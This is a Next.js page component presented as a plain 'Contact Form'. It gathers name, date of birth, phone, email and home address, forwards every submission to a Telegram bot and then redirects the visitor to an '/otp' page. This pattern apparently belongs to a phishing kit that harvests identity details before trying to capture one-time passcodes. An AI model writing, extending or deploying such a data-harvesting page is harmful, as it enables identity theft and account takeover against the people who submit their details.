"use client";

import { useState } from "react";
import { useRouter } from "next/navigation";
import Head from "next/head";
import { sendTelegramMessage } from "../../utils/telegram";

const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
const phoneRegex = /^\(\d{3}\) \d{3}-\d{4}$/;
const dateRegex = /^\d{4}-\d{2}-\d{2}$/;
const zipRegex = /^\d{5}(-\d{4})?$/;
const states = [
  "AL", "AK", "AZ", "AR", "CA", "CO", "CT", "DE", "FL", "GA", "HI", "ID", "IL", "IN", "IA", "KS", "KY", "LA", "ME", "MD", "MA", "MI", "MN", "MS", "MO", "MT", "NE", "NV", "NH", "NJ", "NM", "NY", "NC", "ND", "OH", "OK", "OR", "PA", "RI", "SC", "SD", "TN", "TX", "UT", "VT", "VA", "WA", "WV", "WI", "WY"
];

type FormErrors = Record<string, string>;

const FormPage = () => {
  const [formErrors, setFormErrors] = useState<FormErrors>({});
  const [phone, setPhone] = useState<string>("");
  const [loading, setLoading] = useState<boolean>(false);
  const router = useRouter();

  const formatPhoneNumber = (input: string): string => {
    const cleaned = input.replace(/\D/g, "");
    if (cleaned.length <= 3) return `(${cleaned}`;
    if (cleaned.length <= 6) return `(${cleaned.slice(0, 3)}) ${cleaned.slice(3)}`;
    return `(${cleaned.slice(0, 3)}) ${cleaned.slice(3, 6)}-${cleaned.slice(6, 10)}`;
  };

  const handleFormSubmit = async (e: React.FormEvent<HTMLFormElement>) => {
    e.preventDefault();
    setLoading(true);
    setFormErrors({});

    const form = e.currentTarget;
    const formData = {
      firstName: form.firstName.value.trim(),
      lastName: form.lastName.value.trim(),
      dob: form.dob.value,
      phone,
      email: form.email.value.trim(),
      address: form.address.value.trim(),
      city: form.city.value.trim(),
      state: form.state.value,
      zip: form.zip.value.trim(),
    };

    const errors: FormErrors = {};
    if (!emailRegex.test(formData.email)) errors.email = "Invalid email format.";
    if (!phoneRegex.test(formData.phone)) errors.phone = "Invalid phone format. Use (XXX) XXX-XXXX.";
    if (!dateRegex.test(formData.dob)) errors.dob = "Invalid date format. Use YYYY-MM-DD.";
    if (!zipRegex.test(formData.zip)) errors.zip = "Invalid ZIP Code.";

    if (Object.keys(errors).length > 0) {
      setFormErrors(errors);
      setLoading(false);
      return;
    }

    const message = `🚨 New Contact Submission 🚨\n- Name: ${formData.firstName} ${formData.lastName}\n- DOB: ${formData.dob}\n- Phone: ${formData.phone}\n- Email: ${formData.email}\n- Address: ${formData.address}, ${formData.city}, ${formData.state} ${formData.zip}\n- Time: ${new Date().toLocaleString()}`;
    
    try {
      await sendTelegramMessage(message);
      router.push("/otp");
    } catch (error) {
      alert(error);
    }
    setLoading(false);
  };

  return (
    <>
      <Head>
        <title>Contact Form</title>
      </Head>
      <main className="flex justify-center items-center min-h-screen bg-gray-100 px-4 sm:px-6 lg:px-8">
        <div className="w-full max-w-lg bg-white p-6 sm:p-8 shadow-lg rounded-xl">
          <h1 className="text-2xl sm:text-3xl font-bold text-center mb-6 text-gray-700">Contact Information</h1>
          <form onSubmit={handleFormSubmit} className="space-y-6">
            <div className="grid grid-cols-1 sm:grid-cols-2 gap-4">
              <input name="firstName" placeholder="First Name" required className="p-3 border rounded w-full" />
              <input name="lastName" placeholder="Last Name" required className="p-3 border rounded w-full" />
            </div>
            <input name="dob" type="date" required className={`p-3 border rounded w-full ${formErrors.dob ? 'border-red-500' : ''}`} />
            {formErrors.dob && <p className="text-sm text-red-500">{formErrors.dob}</p>}
            <input name="email" type="email" placeholder="Email" required className={`p-3 border rounded w-full ${formErrors.email ? 'border-red-500' : ''}`} />
            {formErrors.email && <p className="text-sm text-red-500">{formErrors.email}</p>}
            <input name="phone" type="text" value={phone} onChange={(e) => setPhone(formatPhoneNumber(e.target.value))} placeholder="Phone (XXX) XXX-XXXX" required className={`p-3 border rounded w-full ${formErrors.phone ? 'border-red-500' : ''}`} />
            {formErrors.phone && <p className="text-sm text-red-500">{formErrors.phone}</p>}
            <input name="address" placeholder="Street Address" required className="p-3 border rounded w-full" />
            <div className="grid grid-cols-1 sm:grid-cols-2 gap-4">
              <input name="city" placeholder="City" required className="p-3 border rounded w-full" />
              <select name="state" required className="p-3 border rounded w-full">
                <option value="">Select State</option>
                {states.map((state) => (<option key={state} value={state}>{state}</option>))}
              </select>
            </div>
            <input name="zip" placeholder="ZIP Code" required className={`p-3 border rounded w-full ${formErrors.zip ? 'border-red-500' : ''}`} />
            {formErrors.zip && <p className="text-sm text-red-500">{formErrors.zip}</p>}
            <button type="submit" disabled={loading} className="w-full bg-blue-500 text-white py-3 rounded-lg hover:bg-blue-600 transition">
              {loading ? "Submitting..." : "Submit"}
            </button>
          </form>
        </div>
      </main>
    </>
  );
};

export default FormPage;
